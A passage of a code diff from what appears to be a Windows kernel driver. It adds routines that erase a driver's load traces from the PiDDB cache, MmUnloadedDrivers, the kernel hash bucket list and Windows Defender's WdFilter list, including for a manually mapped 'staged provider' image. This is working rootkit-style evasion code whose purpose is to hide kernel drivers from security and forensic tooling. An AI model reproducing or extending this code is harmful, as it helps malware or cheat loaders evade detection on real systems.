+    if (!Complete)
+    {
+        print(ERROR("VerifyWdFilter: walk stopped early, list damaged?"));
+        return;
+    }
+
+    print(OK("VerifyWdFilter: all checks passed (%u records, count %u, none name this driver)"),
+          Walked, InUse);
+}
+
+// One pass over the four load traces, each its own small cleaner above. Runs at load (step 0, wiping
+// what earlier cycles left) and at unload (dropping records from previous cycles; whatever MM adds
+// after the unload callback returns is prevented by DriverExit zeroing BaseDllName.Length)
 bool CleanDriverTraces(win::DRIVER_OBJECT* DriverObject)
 {
-    // All three cleaners are enabled now that each has been fixed; the debug block below verifies the
-    // PiDDB, MmUnloaded and hash-bucket results. (PiDDB note: a missing lock/table/routine or a failed
-    // AVL delete makes ClearPiDDBCache report failure instead of claiming the trace was removed)
-    bool PiDDB = ClearPiDDBCache(DriverObject);
-    bool MmU = ClearMmUnloadedDrivers(DriverObject);
-    bool Hash = ClearKernelHashBucketList(DriverObject);
+    // A manual map has no loader-created DriverSection, so none of these records can belong to this
+    // image. Do not let any of the cleaners run, even if a mapper supplies a partial/fake DriverObject.
+    if (!DriverObject || !DriverObject->DriverSection)
+    {
+        print(INFO("CleanTraces: manual map (no DriverSection), skipping all trace cleaning"));
+        return false;
+    }
+
+    // The loader entry is the target for every cleaner. Its BaseDllName goes through the shared
+    // IsValidTraceTarget check inside each cleaner, which reports and skips when it is unusable
+    auto Kldr = (_KLDR_DATA_TABLE_ENTRY *) DriverObject->DriverSection;
+
+    bool PiDDB = ClearPiDDBCache(&Kldr->BaseDllName, Kldr->TimeDateStamp);
+    bool MmU = ClearMmUnloadedDrivers(&Kldr->BaseDllName, Kldr->TimeDateStamp);
+    bool Hash = ClearKernelHashBucketList(&Kldr->BaseDllName, Kldr->TimeDateStamp);
+    bool WdF = ClearWdFilterDriverList(&Kldr->BaseDllName, Kldr->TimeDateStamp);
 
 #ifdef DEBUG
     // Only when the cleaner itself ran; release builds drop the calls and their functions
-    VerifyPiDDBCache(DriverObject);
-    if (MmU) VerifyMmUnloadedDrivers(DriverObject);
-    if (Hash) VerifyKernelHashBucketList(DriverObject);
+    VerifyPiDDBCache(&Kldr->BaseDllName, Kldr->TimeDateStamp);
+    if (MmU) VerifyMmUnloadedDrivers(&Kldr->BaseDllName, Kldr->TimeDateStamp);
+    if (Hash) VerifyKernelHashBucketList(&Kldr->BaseDllName, Kldr->TimeDateStamp);
+    if (WdF) VerifyWdFilterDriverList(&Kldr->BaseDllName, Kldr->TimeDateStamp);
 #endif
-    print(INFO("CleanTraces: piddb %u, mmu %u, hashbucket %u"), (uint32_t) PiDDB, (uint32_t) MmU, (uint32_t) Hash);
-    return PiDDB && MmU && Hash;
+    print(INFO("CleanTraces: piddb %u, mmu %u, hashbucket %u, wdfilter %u"),
+          (uint32_t) PiDDB, (uint32_t) MmU, (uint32_t) Hash, (uint32_t) WdF);
+    return PiDDB && MmU && Hash && WdF;
+}
+
+// The same four cleaners against an explicitly named image rather than this driver's loader entry. The
+// manual-map path uses it to remove the staged provider's records while the provider is still resident.
+// Timestamp 0 keeps the PiDDB match strictly name-based: PiDDBEntryIsTarget only compares timestamps
+// when the value is non-zero, so an unknown timestamp never acts as a wildcard
+bool CleanExtraTraces(const _UNICODE_STRING* Target)
+{
+    // The manual-map second parameter is only a candidate: require the structure itself to be
+    // kernel-resident and mapped before the shared helper dereferences it, then its name and buffer
+    if (!IsKernelPointer((uint64_t) Target) ||
+        !IsAddressValid((address) (uint64_t) Target, GetSystemCr3()) ||
+        !IsValidTraceTarget(Target))
+    {
+        print(ERROR("CleanTraces: extra target is not a valid image name, skipped"));
+        return false;
+    }
+
+    ::print(INFO("CleanTraces: extra target %wZ, no timestamp match"), Target);
+
+    bool PiDDB = ClearPiDDBCache(Target, 0);
+    bool MmU = ClearMmUnloadedDrivers(Target, 0);
+    bool Hash = ClearKernelHashBucketList(Target, 0);
+    bool WdF = ClearWdFilterDriverList(Target, 0);
+
+#ifdef DEBUG
+    // Only when the cleaner itself succeeded; release builds drop the calls and their functions
+    if (PiDDB) VerifyPiDDBCache(Target, 0);
+    if (MmU) VerifyMmUnloadedDrivers(Target, 0);
+    if (Hash) VerifyKernelHashBucketList(Target, 0);
+    if (WdF) VerifyWdFilterDriverList(Target, 0);
+#endif
+    print(INFO("CleanTraces: extra piddb %u, mmu %u, hashbucket %u, wdfilter %u"),
+          (uint32_t) PiDDB, (uint32_t) MmU, (uint32_t) Hash, (uint32_t) WdF);
+    return PiDDB && MmU && Hash && WdF;
 }
